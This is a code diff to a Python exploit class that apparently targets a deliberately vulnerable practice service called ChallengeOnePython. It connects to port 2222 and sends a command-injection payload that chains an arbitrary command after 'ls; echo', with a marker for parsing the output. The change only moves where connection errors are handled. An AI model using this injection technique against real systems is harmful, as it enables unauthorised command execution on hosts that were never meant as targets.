@@ -13,15 +13,11 @@ class ChallengeOnePython(Exploit):
 		super().__init__(ip_address=ip_address)
 
 	def run_custom_command(self, command):
-		try:
-			port = 2222
-			logger.info(f"Connecting to port {port}...")
-			socket_connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-			socket_connection.connect((self.ip_address, port))
-			logger.info(f"Successfully connected to port {port}.")
-		except ConnectionRefusedError as err:
-			logger.info(f"{COLOR_FAIL}The challenge one python service is not running!{COLOR_END}")
-			return False
+		port = 2222
+		logger.info(f"Connecting to port {port}...")
+		socket_connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+		socket_connection.connect((self.ip_address, port))
+		logger.info(f"Successfully connected to port {port}.")
 
 		exploit_command = f"ls; echo '0x1x2x3'; {command}" # echo 0x1x2x3 so we can parse for where the actual command injection output begins
 		logger.info(f"Running command `{exploit_command}`...")
@@ -48,9 +44,13 @@ class ChallengeOnePython(Exploit):
 		try:
 			logger.info("Testing if the target is vulnerable to ChallengeOnePython...")
 			command = "whoami"
-			self.run_custom_command(command=command)
-			logger.info(f"{COLOR_OKGREEN}The target is vulnerable to ChallengeOnePython!{COLOR_END}")
-			return True
+			try:
+				self.run_custom_command(command=command)
+				logger.info(f"{COLOR_OKGREEN}The target is vulnerable to ChallengeOnePython!{COLOR_END}")
+				return True
+			except ConnectionRefusedError:
+				logger.info(f"{COLOR_ORANGE}The challenge one python service is not running!{COLOR_END}")
+				return False
 		except PatchedException:
 			logger.info(f"{COLOR_FAIL}The target is not vulnerable to ChallengeOnePython.{COLOR_END}")
 			return False
